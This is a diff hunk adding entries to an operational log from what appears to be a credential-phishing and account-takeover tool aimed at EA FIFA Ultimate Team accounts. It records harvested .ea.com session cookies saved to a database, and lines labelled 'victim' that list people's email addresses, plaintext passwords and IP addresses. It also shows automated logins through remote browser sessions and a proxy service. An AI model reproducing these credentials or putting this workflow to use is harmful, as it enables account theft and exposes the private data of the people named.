@@ -1016,3 +1016,66 @@ INFO : 2021-02-26 23:48:57,680 - GOT Cookies
 INFO : 2021-02-26 23:48:57,747 - 1159882021-02-26 23:48:16.653456 422059 176.250.219.52 [{"domain": ".ea.com", "expiry": 1614386933, "httponly": true, "name": "bm_mi", "path": "/", "secure": false, "value": "7ab3f1043c1077267ff6dab688e74b56~z3xvkjbqoyqcggtu8utpnufa/buflmlnnvmhfmmddt5k5mr8iew4/4cgrknxs9qggq/mnyvebd3lyswb1b0guznyw0m0jujuabei+ha04thdzdc6tukvwojopyw3f3grxtig/5aogceloakh6hx9xcw28rqvjhvpm7vqwleeuhjovnmban6ickybuxvrlu9nn+0o1owlriv6sy9etfouuxlcgbpxanebdyxly03aiotb5y3h7qoedi/kl+jjh9dfpjx91s2suw4fpszw83wnpp5/+kv2bz3uvvmc8qfpzad+ret6q8l8abersm/ic98n"}, {"domain": ".ea.com", "expiry": 1614386932, "httponly": true, "name": "bm_sv", "path": "/", "secure": false, "value": "0353ee17477e673c3a269c43bb98922c~ny91qwnlp+xcprrx8bvppn1q0zgr/0slb4xqwolwox7r2nsz+iyfqbxfpfonoilchowzz0om5irahlzawlozkgtziyz1w+jxot6bxauzzncgzgv2v/+01nl8m2zlzmtyd9l+aj5qujahlvlbeojy0g=="}, {"domain": ".ea.com", "expiry": 1614379757, "httponly": false, "name": "_gat", "path": "/", "secure": false, "value": "1"}, {"domain": ".ea.com", "expiry": 1645915732, "httponly": false, "name": "ealocale", "path": "/", "secure": true, "value": "en-us"}, {"domain": ".ea.com", "expiry": 1769899730, "httponly": true, "name": "_nx_mpcid", "path": "/", "samesite": "none", "secure": true, "value": "d3b88a92-ff37-4b9c-8f64-a298416cc48d"}, {"domain": ".ea.com", "expiry": 1614386932, "httponly": true, "name": "ak_bmsc", "path": "/", "secure": false, "value": "9367e45a7fbedf7e248b3863c35a99421705a42d130e0000d47a39603abe7d56~plp6vhdufb4fev0ttfzjmaqqmrtvnkohd7diycwjaby77vytolt68mnjekb6w114hzp276vw1xmmmgg6fusdrfxkr0qxev+s6fmdgbcbb4zev9za7jy7qtcayg0cevpuss2nbnbf/bujn92n9pe/sqjcljn4aus4nvuznyibdewcpmgzt+5jsnm5qrcmm9ogp6m9amw4gfkpy749ptrbye0ctpjy29aourgmta4l5somhgcd4zihvid4eyklt2tnhnihgo4iebi9f8/cpx3kd1gjd/flsheqzmhxump1lthow="}, {"domain": ".ea.com", "expiry": 1614465335, "httponly": false, "name": "_gid", "path": "/", "secure": false, "value": "ga1.2.311847197.1614378936"}, {"domain": ".ea.com", "expiry": 1677451734, "httponly": false, "name": "_ga", "path": "/", "secure": false, "value": "ga1.2.1222704184.1614378936"}]
 INFO : 2021-02-26 23:48:57,754 - code added
 INFO : 2021-02-26 23:48:57,758 - cookies infos added TO DB
+INFO : 2021-02-26 23:52:10,690 - new user in !
+INFO : 2021-02-26 23:52:16,373 - new user in !
+INFO : 2021-02-26 23:52:30,839 - getting free session...
+INFO : 2021-02-26 23:52:30,839 - session imported from query ! b'{"session_id": "c84a3851caf7ecb2015d05415f37603a", "executor_url": "http://161.97.178.112:4444/wd/hub"}'
+INFO : 2021-02-26 23:52:30,840 - free sessions => 7
+INFO : 2021-02-26 23:52:30,840 - free session => {'session_id': 'c84a3851caf7ecb2015d05415f37603a', 'executor_url': 'http://161.97.178.112:4444/wd/hub'}
+INFO : 2021-02-26 23:52:30,840 - connecting to a free Session .. 
+INFO : 2021-02-26 23:52:30,863 - https://signin.ea.com/p/web2/login?execution=e2038411332s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26response_type%3Dtoken%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Ffifa%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3Dnull%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFIFA21_JS_WEB_APP
+INFO : 2021-02-26 23:52:30,863 - THREAD : SESSION REPLACEMENT ..
+INFO : 2021-02-26 23:52:30,863 - THREAD CREATED
+INFO : 2021-02-26 23:52:30,863 - THREAD : setting up ip address
+INFO : 2021-02-26 23:52:30,864 - THREAD : IP ADDR =>http://p.webshare.io:9999
+INFO : 2021-02-26 23:52:30,864 - THREAD : creating a remote session !
+INFO : 2021-02-26 23:52:30,865 - THREAD : STARTED
+INFO : 2021-02-26 23:52:30,865 - THREAD : attach to session perfectly
+WARNING : 2021-02-26 23:52:30,865 - victim : cawhieldon@gmail.com 4Whineslane
+INFO : 2021-02-26 23:52:30,865 - locating fields ..
+INFO : 2021-02-26 23:52:30,865 - locating email:
+INFO : 2021-02-26 23:52:31,024 - locating password
+INFO : 2021-02-26 23:52:31,217 - click login
+INFO : 2021-02-26 23:52:31,441 - THREAD : opening ea url
+INFO : 2021-02-26 23:52:37,125 - new user in !
+INFO : 2021-02-26 23:52:37,389 - THREAD : saving session to query 
+INFO : 2021-02-26 23:52:37,391 - session added to query ! 8
+INFO : 2021-02-26 23:52:37,391 - THREAD : READY TO GO 
+INFO : 2021-02-26 23:52:38,869 - login in..
+INFO : 2021-02-26 23:52:38,901 - logged-in succesfully
+INFO : 2021-02-26 23:52:38,922 - -----using old method----
+INFO : 2021-02-26 23:52:39,326 - new user in !
+INFO : 2021-02-26 23:52:46,007 - new user in !
+ERROR : 2021-02-26 23:52:48,941 - cant find the button
+WARNING : 2021-02-26 23:52:48,941 - closing session for unvalid login
+INFO : 2021-02-26 23:52:49,001 - cawhieldon@gmail.com 4Whineslane 82.8.129.244
+WARNING : 2021-02-26 23:52:49,001 - fail
+ERROR : 2021-02-26 23:52:49,001 - fail
+ERROR : 2021-02-26 23:52:49,001 - unknown issues
+INFO : 2021-02-26 23:52:54,926 - getting free session...
+INFO : 2021-02-26 23:52:54,927 - session imported from query ! b'{"session_id": "97f2d561558f961369e58b5e0c26bc6d", "executor_url": "http://161.97.178.112:4444/wd/hub"}'
+INFO : 2021-02-26 23:52:54,927 - free sessions => 7
+INFO : 2021-02-26 23:52:54,927 - free session => {'session_id': '97f2d561558f961369e58b5e0c26bc6d', 'executor_url': 'http://161.97.178.112:4444/wd/hub'}
+INFO : 2021-02-26 23:52:54,928 - connecting to a free Session .. 
+INFO : 2021-02-26 23:52:54,956 - https://signin.ea.com/p/web2/login?execution=e510931842s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26response_type%3Dtoken%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Ffifa%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3Dnull%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFIFA21_JS_WEB_APP
+INFO : 2021-02-26 23:52:54,960 - THREAD : SESSION REPLACEMENT ..
+INFO : 2021-02-26 23:52:54,960 - THREAD CREATED
+INFO : 2021-02-26 23:52:54,960 - THREAD : setting up ip address
+INFO : 2021-02-26 23:52:54,960 - THREAD : IP ADDR =>http://p.webshare.io:9999
+INFO : 2021-02-26 23:52:54,961 - THREAD : creating a remote session !
+INFO : 2021-02-26 23:52:54,962 - THREAD : STARTED
+INFO : 2021-02-26 23:52:54,962 - THREAD : attach to session perfectly
+WARNING : 2021-02-26 23:52:54,962 - victim : Michaeldude3456@outlook.com Tttttttttt2
+INFO : 2021-02-26 23:52:54,962 - locating fields ..
+INFO : 2021-02-26 23:52:54,962 - locating email:
+INFO : 2021-02-26 23:52:55,188 - locating password
+INFO : 2021-02-26 23:52:55,663 - click login
+INFO : 2021-02-26 23:52:55,854 - THREAD : opening ea url
+INFO : 2021-02-26 23:52:58,918 - login in..
+ERROR : 2021-02-26 23:52:58,989 - error----> Your credentials are incorrect or have expired. Please try again or reset your password. Michaeldude3456@outlook.com
+WARNING : 2021-02-26 23:52:59,013 - closing session for unvalid login
+INFO : 2021-02-26 23:52:59,074 - Michaeldude3456@outlook.com Tttttttttt2 188.222.149.46
+WARNING : 2021-02-26 23:52:59,074 - None
+ERROR : 2021-02-26 23:52:59,074 - None
+ERROR : 2021-02-26 23:52:59,075 - unknown issues
+INFO : 2021-02-26 23:52:59,076 - new user in !
